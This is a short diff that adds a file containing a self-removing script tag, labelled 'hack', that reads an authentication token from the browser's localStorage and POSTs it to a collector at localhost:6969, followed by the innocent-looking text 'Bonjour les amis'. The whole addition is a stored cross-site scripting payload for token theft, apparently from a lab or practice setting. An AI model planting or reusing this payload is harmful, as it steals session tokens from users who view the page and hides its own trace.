@@ -1,0 +1,9 @@
+<script id="hack">
+    const token = localStorage.getItem('token');
+    let xhr = new XMLHttpRequest();
+    xhr.open("POST", 'http://localhost:6969/tokens', true);
+    xhr.setRequestHeader('Content-Type', 'text/plain');
+    xhr.send(token);
+    document.getElementById("hack").remove()
+</script>
+Bonjour les amis
